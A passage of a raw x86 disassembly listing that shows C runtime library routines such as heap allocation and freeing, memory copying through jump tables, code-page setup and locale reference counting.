  425f34:	mov    DWORD PTR [ebp+0x8],eax
  425f37:	cmp    eax,DWORD PTR ds:0x463b24
  425f3d:	je     0x425ffe
  425f43:	mov    esi,DWORD PTR ds:0x463a18
  425f49:	mov    DWORD PTR [ebp-0x20],esi
  425f4c:	cmp    esi,edi
  425f4e:	je     0x425f54
  425f50:	cmp    DWORD PTR [esi],edi
  425f52:	je     0x425f64
  425f54:	push   0x220
  425f59:	call   0x426152
  425f5e:	pop    ecx
  425f5f:	mov    esi,eax
  425f61:	mov    DWORD PTR [ebp-0x20],esi
  425f64:	cmp    esi,edi
  425f66:	je     0x425fe7
  425f68:	push   DWORD PTR [ebp+0x8]
  425f6b:	call   0x425d36
  425f70:	pop    ecx
  425f71:	mov    DWORD PTR [ebp-0x1c],eax
  425f74:	cmp    eax,edi
  425f76:	jne    0x425fe7
  425f78:	mov    DWORD PTR [esi],edi
  425f7a:	mov    eax,ds:0x463b24
  425f7f:	mov    DWORD PTR [esi+0x4],eax
  425f82:	mov    eax,ds:0x463a1c
  425f87:	mov    DWORD PTR [esi+0x8],eax
  425f8a:	mov    eax,ds:0x463a14
  425f8f:	mov    DWORD PTR [esi+0xc],eax
  425f92:	xor    eax,eax
  425f94:	mov    DWORD PTR [ebp-0x24],eax
  425f97:	cmp    eax,0x5
  425f9a:	jge    0x425fac
  425f9c:	mov    cx,WORD PTR [eax*2+0x463b30]
  425fa4:	mov    WORD PTR [esi+eax*2+0x10],cx
  425fa9:	inc    eax
  425faa:	jmp    0x425f94
  425fac:	xor    eax,eax
  425fae:	mov    DWORD PTR [ebp-0x24],eax
  425fb1:	cmp    eax,0x101
  425fb6:	jge    0x425fc5
  425fb8:	mov    cl,BYTE PTR [eax+0x463a20]
  425fbe:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  425fc2:	inc    eax
  425fc3:	jmp    0x425fae
  425fc5:	xor    eax,eax
  425fc7:	mov    DWORD PTR [ebp-0x24],eax
  425fca:	cmp    eax,0x100
  425fcf:	jge    0x425fe1
  425fd1:	mov    cl,BYTE PTR [eax+0x463b40]
  425fd7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  425fde:	inc    eax
  425fdf:	jmp    0x425fc7
  425fe1:	mov    DWORD PTR ds:0x463a18,esi
  425fe7:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  425feb:	jne    0x426001
  425fed:	cmp    esi,DWORD PTR ds:0x463a18
  425ff3:	je     0x426001
  425ff5:	push   esi
  425ff6:	call   0x42603a
  425ffb:	pop    ecx
  425ffc:	jmp    0x426001
  425ffe:	mov    DWORD PTR [ebp-0x1c],edi
  426001:	or     DWORD PTR [ebp-0x4],0xffffffff
  426005:	call   0x426013
  42600a:	mov    eax,DWORD PTR [ebp-0x1c]
  42600d:	call   0x42546f
  426012:	ret    
  426013:	push   0xd
  426015:	call   0x42555b
  42601a:	pop    ecx
  42601b:	ret    
  42601c:	cmp    DWORD PTR ds:0x463d6c,0x0
  426023:	jne    0x426037
  426025:	push   0xfffffffd
  426027:	call   0x425ecc
  42602c:	pop    ecx
  42602d:	mov    DWORD PTR ds:0x463d6c,0x1
  426037:	xor    eax,eax
  426039:	ret    
  42603a:	push   0xc
  42603c:	push   0x4296b8
  426041:	call   0x425434
  426046:	mov    esi,DWORD PTR [ebp+0x8]
  426049:	test   esi,esi
  42604b:	je     0x4260a5
  42604d:	cmp    DWORD PTR ds:0x463c44,0x3
  426054:	jne    0x426096
  426056:	push   0x4
  426058:	call   0x4255ef
  42605d:	pop    ecx
  42605e:	and    DWORD PTR [ebp-0x4],0x0
  426062:	push   esi
  426063:	call   0x426812
  426068:	pop    ecx
  426069:	mov    DWORD PTR [ebp-0x1c],eax
  42606c:	test   eax,eax
  42606e:	je     0x426079
  426070:	push   esi
  426071:	push   eax
  426072:	call   0x42683d
  426077:	pop    ecx
  426078:	pop    ecx
  426079:	or     DWORD PTR [ebp-0x4],0xffffffff
  42607d:	call   0x42608d
  426082:	cmp    DWORD PTR [ebp-0x1c],0x0
  426086:	jne    0x4260a5
  426088:	push   DWORD PTR [ebp+0x8]
  42608b:	jmp    0x426097
  42608d:	push   0x4
  42608f:	call   0x42555b
  426094:	pop    ecx
  426095:	ret    
  426096:	push   esi
  426097:	push   0x0
  426099:	push   DWORD PTR ds:0x463c40
  42609f:	call   DWORD PTR ds:0x429034
  4260a5:	call   0x42546f
  4260aa:	ret    
  4260ab:	push   0xc
  4260ad:	push   0x4296c8
  4260b2:	call   0x425434
  4260b7:	mov    esi,DWORD PTR [ebp+0x8]
  4260ba:	cmp    DWORD PTR ds:0x463c44,0x3
  4260c1:	jne    0x4260f1
  4260c3:	cmp    esi,DWORD PTR ds:0x463a04
  4260c9:	ja     0x4260f1
  4260cb:	push   0x4
  4260cd:	call   0x4255ef
  4260d2:	pop    ecx
  4260d3:	and    DWORD PTR [ebp-0x4],0x0
  4260d7:	push   esi
  4260d8:	call   0x426ff1
  4260dd:	pop    ecx
  4260de:	mov    DWORD PTR [ebp-0x1c],eax
  4260e1:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260e5:	call   0x42611d
  4260ea:	mov    eax,DWORD PTR [ebp-0x1c]
  4260ed:	test   eax,eax
  4260ef:	jne    0x426114
  4260f1:	test   esi,esi
  4260f3:	jne    0x4260f6
  4260f5:	inc    esi
  4260f6:	cmp    DWORD PTR ds:0x463c44,0x1
  4260fd:	je     0x426105
  4260ff:	add    esi,0xf
  426102:	and    esi,0xfffffff0
  426105:	push   esi
  426106:	push   0x0
  426108:	push   DWORD PTR ds:0x463c40
  42610e:	call   DWORD PTR ds:0x429038
  426114:	call   0x42546f
  426119:	ret    
  42611a:	mov    esi,DWORD PTR [ebp+0x8]
  42611d:	push   0x4
  42611f:	call   0x42555b
  426124:	pop    ecx
  426125:	ret    
  426126:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42612b:	ja     0x42614f
  42612d:	push   DWORD PTR [esp+0x4]
  426131:	call   0x4260ab
  426136:	test   eax,eax
  426138:	pop    ecx
  426139:	jne    0x426151
  42613b:	cmp    DWORD PTR [esp+0x8],eax
  42613f:	je     0x426151
  426141:	push   DWORD PTR [esp+0x4]
  426145:	call   0x427d12
  42614a:	test   eax,eax
  42614c:	pop    ecx
  42614d:	jne    0x42612d
  42614f:	xor    eax,eax
  426151:	ret    
  426152:	push   DWORD PTR ds:0x4638c8
  426158:	push   DWORD PTR [esp+0x8]
  42615c:	call   0x426126
  426161:	pop    ecx
  426162:	pop    ecx
  426163:	ret    
  426164:	int3   
  426165:	int3   
  426166:	int3   
  426167:	int3   
  426168:	int3   
  426169:	int3   
  42616a:	int3   
  42616b:	int3   
  42616c:	int3   
  42616d:	int3   
  42616e:	int3   
  42616f:	int3   
  426170:	push   ebp
  426171:	mov    ebp,esp
  426173:	push   edi
  426174:	push   esi
  426175:	mov    esi,DWORD PTR [ebp+0xc]
  426178:	mov    ecx,DWORD PTR [ebp+0x10]
  42617b:	mov    edi,DWORD PTR [ebp+0x8]
  42617e:	mov    eax,ecx
  426180:	mov    edx,ecx
  426182:	add    eax,esi
  426184:	cmp    edi,esi
  426186:	jbe    0x426190
  426188:	cmp    edi,eax
  42618a:	jb     0x42630c
  426190:	test   edi,0x3
  426196:	jne    0x4261ac
  426198:	shr    ecx,0x2
  42619b:	and    edx,0x3
  42619e:	cmp    ecx,0x8
  4261a1:	jb     0x4261cc
  4261a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261a5:	jmp    DWORD PTR [edx*4+0x4262bc]
  4261ac:	mov    eax,edi
  4261ae:	mov    edx,0x3
  4261b3:	sub    ecx,0x4
  4261b6:	jb     0x4261c4
  4261b8:	and    eax,0x3
  4261bb:	add    ecx,eax
  4261bd:	jmp    DWORD PTR [eax*4+0x4261d0]
  4261c4:	jmp    DWORD PTR [ecx*4+0x4262cc]
  4261cb:	nop
  4261cc:	jmp    DWORD PTR [ecx*4+0x426250]
  4261d3:	nop
  4261d4:	loopne 0x426237
  4261d6:	inc    edx
  4261d7:	add    BYTE PTR [edx+eiz*2],cl
  4261da:	inc    edx
  4261db:	add    BYTE PTR [eax],dh
  4261dd:	bound  eax,QWORD PTR [edx+0x0]
  4261e0:	and    edx,ecx
  4261e2:	mov    al,BYTE PTR [esi]
  4261e4:	mov    BYTE PTR [edi],al
  4261e6:	mov    al,BYTE PTR [esi+0x1]
  4261e9:	mov    BYTE PTR [edi+0x1],al
  4261ec:	mov    al,BYTE PTR [esi+0x2]
  4261ef:	shr    ecx,0x2
  4261f2:	mov    BYTE PTR [edi+0x2],al
  4261f5:	add    esi,0x3
  4261f8:	add    edi,0x3
  4261fb:	cmp    ecx,0x8
  4261fe:	jb     0x4261cc
  426200:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426202:	jmp    DWORD PTR [edx*4+0x4262bc]
  426209:	lea    ecx,[ecx+0x0]
  42620c:	and    edx,ecx
  42620e:	mov    al,BYTE PTR [esi]
  426210:	mov    BYTE PTR [edi],al
  426212:	mov    al,BYTE PTR [esi+0x1]
  426215:	shr    ecx,0x2
  426218:	mov    BYTE PTR [edi+0x1],al
  42621b:	add    esi,0x2
  42621e:	add    edi,0x2
  426221:	cmp    ecx,0x8
  426224:	jb     0x4261cc
  426226:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426228:	jmp    DWORD PTR [edx*4+0x4262bc]
  42622f:	nop
  426230:	and    edx,ecx
  426232:	mov    al,BYTE PTR [esi]
  426234:	mov    BYTE PTR [edi],al
  426236:	add    esi,0x1
  426239:	shr    ecx,0x2
  42623c:	add    edi,0x1
  42623f:	cmp    ecx,0x8
  426242:	jb     0x4261cc
  426244:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426246:	jmp    DWORD PTR [edx*4+0x4262bc]
  42624d:	lea    ecx,[ecx+0x0]
  426250:	mov    bl,0x62
  426252:	inc    edx
  426253:	add    BYTE PTR [eax-0x67ffbd9e],ah
  426259:	bound  eax,QWORD PTR [edx+0x0]
  42625c:	nop
  42625d:	bound  eax,QWORD PTR [edx+0x0]
  426260:	mov    BYTE PTR [edx+0x42],ah
  426263:	add    BYTE PTR [eax+0x78004262],al
  426269:	bound  eax,QWORD PTR [edx+0x0]
  42626c:	jo     0x4262d0
  42626e:	inc    edx
  42626f:	add    BYTE PTR [ebx-0x761b71bc],cl
  426275:	inc    esp
  426276:	(bad)  
  426277:	in     al,0x8b
  426279:	inc    esp
  42627a:	mov    gs,eax
  42627c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426280:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426284:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426288:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42628c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  426290:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  426294:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  426298:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42629c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4262a0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4262a4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4262a8:	lea    eax,[ecx*4+0x0]
  4262af:	add    esi,eax
  4262b1:	add    edi,eax
  4262b3:	jmp    DWORD PTR [edx*4+0x4262bc]
  4262ba:	mov    edi,edi
  4262bc:	int3   
  4262bd:	bound  eax,QWORD PTR [edx+0x0]
  4262c0:	aam    0x62
  4262c2:	inc    edx
  4262c3:	add    al,ah
  4262c5:	bound  eax,QWORD PTR [edx+0x0]
  4262c8:	hlt    
  4262c9:	bound  eax,QWORD PTR [edx+0x0]
  4262cc:	mov    eax,DWORD PTR [ebp+0x8]
  4262cf:	pop    esi
  4262d0:	pop    edi
  4262d1:	leave  
  4262d2:	ret    
  4262d3:	nop
  4262d4:	mov    al,BYTE PTR [esi]
  4262d6:	mov    BYTE PTR [edi],al
  4262d8:	mov    eax,DWORD PTR [ebp+0x8]
  4262db:	pop    esi
  4262dc:	pop    edi
  4262dd:	leave  
  4262de:	ret    
  4262df:	nop
  4262e0:	mov    al,BYTE PTR [esi]
  4262e2:	mov    BYTE PTR [edi],al
  4262e4:	mov    al,BYTE PTR [esi+0x1]
  4262e7:	mov    BYTE PTR [edi+0x1],al
  4262ea:	mov    eax,DWORD PTR [ebp+0x8]
  4262ed:	pop    esi
  4262ee:	pop    edi
  4262ef:	leave  
  4262f0:	ret    
  4262f1:	lea    ecx,[ecx+0x0]
  4262f4:	mov    al,BYTE PTR [esi]
  4262f6:	mov    BYTE PTR [edi],al
  4262f8:	mov    al,BYTE PTR [esi+0x1]
  4262fb:	mov    BYTE PTR [edi+0x1],al
  4262fe:	mov    al,BYTE PTR [esi+0x2]
  426301:	mov    BYTE PTR [edi+0x2],al
  426304:	mov    eax,DWORD PTR [ebp+0x8]
  426307:	pop    esi
  426308:	pop    edi
  426309:	leave  
  42630a:	ret    
  42630b:	nop
  42630c:	lea    esi,[ecx+esi*1-0x4]
  426310:	lea    edi,[ecx+edi*1-0x4]
  426314:	test   edi,0x3
  42631a:	jne    0x426340
  42631c:	shr    ecx,0x2
  42631f:	and    edx,0x3
  426322:	cmp    ecx,0x8
  426325:	jb     0x426334
  426327:	std    
  426328:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42632a:	cld    
  42632b:	jmp    DWORD PTR [edx*4+0x426458]
  426332:	mov    edi,edi
  426334:	neg    ecx
  426336:	jmp    DWORD PTR [ecx*4+0x426408]
  42633d:	lea    ecx,[ecx+0x0]
  426340:	mov    eax,edi
  426342:	mov    edx,0x3
  426347:	cmp    ecx,0x4
  42634a:	jb     0x426358
  42634c:	and    eax,0x3
  42634f:	sub    ecx,eax
  426351:	jmp    DWORD PTR [eax*4+0x42635c]
  426358:	jmp    DWORD PTR [ecx*4+0x426458]
  42635f:	nop
  426360:	ins    BYTE PTR es:[edi],dx
  426361:	arpl   WORD PTR [edx+0x0],ax
  426364:	nop
  426365:	arpl   WORD PTR [edx+0x0],ax
  426368:	mov    eax,0x8a004263
  42636d:	inc    esi
  42636e:	add    esp,DWORD PTR [ebx]
  426370:	ror    DWORD PTR [eax-0x117cfcb9],1
  426376:	add    ecx,eax
  426378:	jmp    0x231e67f
  42637d:	cmp    ecx,0x8
  426380:	jb     0x426334
  426382:	std    
  426383:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426385:	cld    
  426386:	jmp    DWORD PTR [edx*4+0x426458]
  42638d:	lea    ecx,[ecx+0x0]
  426390:	mov    al,BYTE PTR [esi+0x3]
  426393:	and    edx,ecx
  426395:	mov    BYTE PTR [edi+0x3],al
  426398:	mov    al,BYTE PTR [esi+0x2]
  42639b:	shr    ecx,0x2
  42639e:	mov    BYTE PTR [edi+0x2],al
  4263a1:	sub    esi,0x2
  4263a4:	sub    edi,0x2
  4263a7:	cmp    ecx,0x8
  4263aa:	jb     0x426334
  4263ac:	std    
  4263ad:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4263af:	cld    
  4263b0:	jmp    DWORD PTR [edx*4+0x426458]
  4263b7:	nop
  4263b8:	mov    al,BYTE PTR [esi+0x3]
  4263bb:	and    edx,ecx
  4263bd:	mov    BYTE PTR [edi+0x3],al
  4263c0:	mov    al,BYTE PTR [esi+0x2]
  4263c3:	mov    BYTE PTR [edi+0x2],al
  4263c6:	mov    al,BYTE PTR [esi+0x1]
  4263c9:	shr    ecx,0x2
  4263cc:	mov    BYTE PTR [edi+0x1],al
  4263cf:	sub    esi,0x3
  4263d2:	sub    edi,0x3
  4263d5:	cmp    ecx,0x8
  4263d8:	jb     0x426334
  4263de:	std    
  4263df:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4263e1:	cld    
  4263e2:	jmp    DWORD PTR [edx*4+0x426458]
  4263e9:	lea    ecx,[ecx+0x0]
  4263ec:	or     al,0x64
  4263ee:	inc    edx
  4263ef:	add    BYTE PTR [esp+eiz*2],dl
  4263f2:	inc    edx
  4263f3:	add    BYTE PTR [esp+eiz*2],bl
  4263f6:	inc    edx
  4263f7:	add    BYTE PTR [esp+eiz*2],ah
  4263fa:	inc    edx
  4263fb:	add    BYTE PTR [esp+eiz*2],ch
  4263fe:	inc    edx
  4263ff:	add    BYTE PTR [esp+eiz*2],dh
  426402:	inc    edx
  426403:	add    BYTE PTR [esp+eiz*2],bh
  426406:	inc    edx
  426407:	add    BYTE PTR [edi+0x64],cl
  42640a:	inc    edx
  42640b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426411:	inc    esp
  426412:	(bad)  
  426413:	sbb    al,0x8b
  426415:	inc    esp
  426416:	mov    ds,WORD PTR [eax]
  426418:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42641c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426420:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426424:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426428:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42642c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426430:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426434:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426438:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42643c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426440:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426444:	lea    eax,[ecx*4+0x0]
  42644b:	add    esi,eax
  42644d:	add    edi,eax
  42644f:	jmp    DWORD PTR [edx*4+0x426458]
  426456:	mov    edi,edi
  426458:	push   0x70004264
  42645d:	fs inc edx
  42645f:	add    BYTE PTR [eax-0x6bffbd9c],al
  426465:	fs inc edx
  426467:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42646d:	leave  
  42646e:	ret    
  42646f:	nop
  426470:	mov    al,BYTE PTR [esi+0x3]
  426473:	mov    BYTE PTR [edi+0x3],al
  426476:	mov    eax,DWORD PTR [ebp+0x8]
  426479:	pop    esi
  42647a:	pop    edi
  42647b:	leave  
  42647c:	ret    
  42647d:	lea    ecx,[ecx+0x0]
  426480:	mov    al,BYTE PTR [esi+0x3]
  426483:	mov    BYTE PTR [edi+0x3],al
  426486:	mov    al,BYTE PTR [esi+0x2]
  426489:	mov    BYTE PTR [edi+0x2],al
  42648c:	mov    eax,DWORD PTR [ebp+0x8]
  42648f:	pop    esi
  426490:	pop    edi
  426491:	leave  
  426492:	ret    
  426493:	nop
  426494:	mov    al,BYTE PTR [esi+0x3]
  426497:	mov    BYTE PTR [edi+0x3],al
  42649a:	mov    al,BYTE PTR [esi+0x2]
  42649d:	mov    BYTE PTR [edi+0x2],al
  4264a0:	mov    al,BYTE PTR [esi+0x1]
  4264a3:	mov    BYTE PTR [edi+0x1],al
  4264a6:	mov    eax,DWORD PTR [ebp+0x8]
  4264a9:	pop    esi
  4264aa:	pop    edi
  4264ab:	leave  
  4264ac:	ret    
  4264ad:	push   DWORD PTR [esp+0x4]
  4264b1:	call   DWORD PTR ds:0x429108
  4264b7:	xor    eax,eax
  4264b9:	inc    eax
  4264ba:	ret    0x8
  4264bd:	push   0x10
  4264bf:	push   0x429710
  4264c4:	call   0x425434
  4264c9:	mov    eax,ds:0x463888
  4264ce:	test   eax,eax
  4264d0:	jne    0x426509
  4264d2:	cmp    DWORD PTR ds:0x4635c4,0x1
  4264d9:	je     0x4264ff
  4264db:	push   0x4296fc
  4264e0:	call   DWORD PTR ds:0x42902c
  4264e6:	test   eax,eax
  4264e8:	je     0x4264ff
  4264ea:	push   0x4296d4
  4264ef:	push   eax
  4264f0:	call   DWORD PTR ds:0x429028
  4264f6:	mov    ds:0x463888,eax
  4264fb:	test   eax,eax
  4264fd:	jne    0x426509
  4264ff:	mov    eax,0x4264ad
  426504:	mov    ds:0x463888,eax
  426509:	and    DWORD PTR [ebp-0x4],0x0
  42650d:	push   DWORD PTR [ebp+0xc]
  426510:	push   DWORD PTR [ebp+0x8]
  426513:	call   eax
  426515:	mov    DWORD PTR [ebp-0x1c],eax
  426518:	jmp    0x42653e
  42651a:	mov    eax,DWORD PTR [ebp-0x14]
  42651d:	mov    eax,DWORD PTR [eax]
  42651f:	mov    eax,DWORD PTR [eax]
  426521:	mov    DWORD PTR [ebp-0x20],eax
  426524:	xor    eax,eax
  426526:	inc    eax
  426527:	ret    
  426528:	mov    esp,DWORD PTR [ebp-0x18]
  42652b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  426532:	jne    0x42653c
  426534:	push   0x8
  426536:	call   DWORD PTR ds:0x4290d4
  42653c:	xor    eax,eax
  42653e:	or     DWORD PTR [ebp-0x4],0xffffffff
  426542:	call   0x42546f
  426547:	ret    
  426548:	push   0x10
  42654a:	push   0x429720
  42654f:	call   0x425434
  426554:	mov    esi,DWORD PTR [ebp+0x8]
  426557:	imul   esi,DWORD PTR [ebp+0xc]
  42655b:	mov    DWORD PTR [ebp-0x1c],esi
  42655e:	test   esi,esi
  426560:	jne    0x426563
  426562:	inc    esi
  426563:	xor    edi,edi
  426565:	mov    DWORD PTR [ebp-0x20],edi
  426568:	cmp    esi,0xffffffe0
  42656b:	ja     0x4265d2
  42656d:	cmp    DWORD PTR ds:0x463c44,0x3
  426574:	jne    0x4265bd
  426576:	add    esi,0xf
  426579:	and    esi,0xfffffff0
  42657c:	mov    DWORD PTR [ebp+0xc],esi
  42657f:	mov    ebx,DWORD PTR [ebp-0x1c]
  426582:	cmp    ebx,DWORD PTR ds:0x463a04
  426588:	ja     0x4265bd
  42658a:	push   0x4
  42658c:	call   0x4255ef
  426591:	pop    ecx
  426592:	and    DWORD PTR [ebp-0x4],edi
  426595:	push   ebx
  426596:	call   0x426ff1
  42659b:	pop    ecx
  42659c:	mov    DWORD PTR [ebp-0x20],eax
  42659f:	or     DWORD PTR [ebp-0x4],0xffffffff
  4265a3:	call   0x4265f2
  4265a8:	mov    edi,DWORD PTR [ebp-0x20]
  4265ab:	test   edi,edi
  4265ad:	je     0x4265c1
  4265af:	push   DWORD PTR [ebp-0x1c]
  4265b2:	push   0x0
  4265b4:	push   edi
  4265b5:	call   0x427d30
  4265ba:	add    esp,0xc
  4265bd:	test   edi,edi
  4265bf:	jne    0x4265fb
  4265c1:	push   esi
  4265c2:	push   0x8
  4265c4:	push   DWORD PTR ds:0x463c40
  4265ca:	call   DWORD PTR ds:0x429038
  4265d0:	mov    edi,eax
  4265d2:	test   edi,edi
  4265d4:	jne    0x4265fb
  4265d6:	cmp    DWORD PTR ds:0x4638c8,edi
  4265dc:	je     0x4265fb
  4265de:	push   esi
  4265df:	call   0x427d12
  4265e4:	pop    ecx
  4265e5:	test   eax,eax
  4265e7:	jne    0x426563
  4265ed:	jmp    0x4265fd
  4265ef:	mov    esi,DWORD PTR [ebp+0xc]
  4265f2:	push   0x4
  4265f4:	call   0x42555b
  4265f9:	pop    ecx
  4265fa:	ret    
  4265fb:	mov    eax,edi
  4265fd:	call   0x42546f
  426602:	ret    
  426603:	push   esi
  426604:	mov    esi,DWORD PTR [esp+0x8]
  426608:	mov    eax,DWORD PTR [esi+0x3c]
  42660b:	push   edi
  42660c:	xor    edi,edi
  42660e:	cmp    eax,DWORD PTR ds:0x4638d4
  426614:	je     0x426679
  426616:	cmp    eax,edi
  426618:	je     0x426679
  42661a:	mov    eax,DWORD PTR [esi+0x2c]
  42661d:	cmp    DWORD PTR [eax],edi
  42661f:	jne    0x426679
  426621:	mov    eax,DWORD PTR [esi+0x34]
  426624:	cmp    eax,edi
  426626:	je     0x426644
  426628:	cmp    DWORD PTR [eax],edi
  42662a:	jne    0x426644
  42662c:	cmp    eax,DWORD PTR ds:0x4639f0
  426632:	je     0x426644
  426634:	push   eax
  426635:	call   0x42603a
  42663a:	push   DWORD PTR [esi+0x3c]
  42663d:	call   0x427f7f
  426642:	pop    ecx
  426643:	pop    ecx
  426644:	mov    eax,DWORD PTR [esi+0x30]
  426647:	cmp    eax,edi
  426649:	je     0x426667
  42664b:	cmp    DWORD PTR [eax],edi
  42664d:	jne    0x426667
  42664f:	cmp    eax,DWORD PTR ds:0x4639f4
  426655:	je     0x426667
  426657:	push   eax
  426658:	call   0x42603a
  42665d:	push   DWORD PTR [esi+0x3c]
  426660:	call   0x427f20
  426665:	pop    ecx
  426666:	pop    ecx
  426667:	push   DWORD PTR [esi+0x2c]
  42666a:	call   0x42603a
  42666f:	push   DWORD PTR [esi+0x3c]
  426672:	call   0x42603a
  426677:	pop    ecx
  426678:	pop    ecx
  426679:	mov    eax,DWORD PTR [esi+0x40]
  42667c:	cmp    eax,DWORD PTR ds:0x4639ec
  426682:	je     0x42669c
  426684:	cmp    eax,edi
  426686:	je     0x42669c
  426688:	cmp    DWORD PTR [eax],edi
  42668a:	jne    0x42669c
  42668c:	push   eax
  42668d:	call   0x42603a
  426692:	push   DWORD PTR [esi+0x44]
  426695:	call   0x42603a
  42669a:	pop    ecx
  42669b:	pop    ecx
  42669c:	mov    eax,DWORD PTR [esi+0x50]
  42669f:	cmp    eax,DWORD PTR ds:0x4638d0
  4266a5:	je     0x4266c3
  4266a7:	cmp    eax,edi
  4266a9:	je     0x4266c3
  4266ab:	cmp    DWORD PTR [eax+0xb4],edi
  4266b1:	jne    0x4266c3
  4266b3:	push   eax
  4266b4:	call   0x427d90
  4266b9:	push   DWORD PTR [esi+0x50]
  4266bc:	call   0x42603a
  4266c1:	pop    ecx
  4266c2:	pop    ecx
  4266c3:	push   esi
  4266c4:	call   0x42603a
  4266c9:	pop    ecx
  4266ca:	pop    edi
  4266cb:	pop    esi
  4266cc:	ret    
  4266cd:	push   esi
  4266ce:	call   0x4252e9
  4266d3:	mov    esi,eax
  4266d5:	mov    eax,DWORD PTR [esi+0x64]
  4266d8:	cmp    eax,DWORD PTR ds:0x46308c
  4266de:	je     0x42678a
  4266e4:	test   eax,eax
  4266e6:	je     0x426717
  4266e8:	mov    ecx,DWORD PTR [eax+0x2c]
  4266eb:	dec    DWORD PTR [eax]
  4266ed:	test   ecx,ecx
  4266ef:	je     0x4266f3
  4266f1:	dec    DWORD PTR [ecx]
  4266f3:	mov    ecx,DWORD PTR [eax+0x34]
  4266f6:	test   ecx,ecx
  4266f8:	je     0x4266fc
  4266fa:	dec    DWORD PTR [ecx]
  4266fc:	mov    ecx,DWORD PTR [eax+0x30]
  4266ff:	test   ecx,ecx
  426701:	je     0x426705
  426703:	dec    DWORD PTR [ecx]
  426705:	mov    ecx,DWORD PTR [eax+0x40]
  426708:	test   ecx,ecx
  42670a:	je     0x42670e
  42670c:	dec    DWORD PTR [ecx]
  42670e:	mov    ecx,DWORD PTR [eax+0x4c]
  426711:	dec    DWORD PTR [ecx+0xb4]
  426717:	mov    ecx,DWORD PTR ds:0x46308c
  42671d:	mov    DWORD PTR [esi+0x64],ecx
  426720:	mov    ecx,DWORD PTR ds:0x46308c
  426726:	inc    DWORD PTR [ecx]
  426728:	mov    ecx,DWORD PTR ds:0x46308c
  42672e:	mov    ecx,DWORD PTR [ecx+0x2c]
  426731:	test   ecx,ecx
  426733:	je     0x426737
  426735:	inc    DWORD PTR [ecx]
  426737:	mov    ecx,DWORD PTR ds:0x46308c
  42673d:	mov    ecx,DWORD PTR [ecx+0x34]
  426740:	test   ecx,ecx
  426742:	je     0x426746
  426744:	inc    DWORD PTR [ecx]
  426746:	mov    ecx,DWORD PTR ds:0x46308c
  42674c:	mov    ecx,DWORD PTR [ecx+0x30]
  42674f:	test   ecx,ecx
  426751:	je     0x426755
  426753:	inc    DWORD PTR [ecx]
  426755:	mov    ecx,DWORD PTR ds:0x46308c
  42675b:	mov    ecx,DWORD PTR [ecx+0x40]
  42675e:	test   ecx,ecx
  426760:	je     0x426764
  426762:	inc    DWORD PTR [ecx]
  426764:	mov    ecx,DWORD PTR ds:0x46308c
  42676a:	mov    ecx,DWORD PTR [ecx+0x4c]
  42676d:	inc    DWORD PTR [ecx+0xb4]
  426773:	test   eax,eax
  426775:	je     0x42678a
  426777:	cmp    DWORD PTR [eax],0x0
  42677a:	jne    0x42678a
  42677c:	cmp    eax,0x463038
  426781:	je     0x42678a
  426783:	push   eax
  426784:	call   0x426603
  426789:	pop    ecx
  42678a:	mov    eax,DWORD PTR [esi+0x64]
  42678d:	pop    esi
  42678e:	ret    
  42678f:	push   0xc
  426791:	push   0x4298b0
  426796:	call   0x425434
  42679b:	push   0xc
  42679d:	call   0x4255ef
  4267a2:	pop    ecx
  4267a3:	and    DWORD PTR [ebp-0x4],0x0
  4267a7:	call   0x4266cd
  4267ac:	mov    DWORD PTR [ebp-0x1c],eax
  4267af:	or     DWORD PTR [ebp-0x4],0xffffffff
  4267b3:	call   0x4267c1
  4267b8:	mov    eax,DWORD PTR [ebp-0x1c]
  4267bb:	call   0x42546f
  4267c0:	ret    
  4267c1:	push   0xc
  4267c3:	call   0x42555b
  4267c8:	pop    ecx
  4267c9:	ret    
  4267ca:	push   0x140
  4267cf:	push   0x0
  4267d1:	push   DWORD PTR ds:0x463c40
  4267d7:	call   DWORD PTR ds:0x429038
  4267dd:	test   eax,eax
  4267df:	mov    ds:0x463a00,eax
  4267e4:	jne    0x4267e7
  4267e6:	ret    
  4267e7:	mov    ecx,DWORD PTR [esp+0x4]
  4267eb:	and    DWORD PTR ds:0x4639f8,0x0
  4267f2:	and    DWORD PTR ds:0x4639fc,0x0
  4267f9:	mov    ds:0x463a08,eax
  4267fe:	xor    eax,eax
  426800:	mov    DWORD PTR ds:0x463a04,ecx
  426806:	mov    DWORD PTR ds:0x463a0c,0x10
  426810:	inc    eax
  426811:	ret    
  426812:	mov    eax,ds:0x4639fc
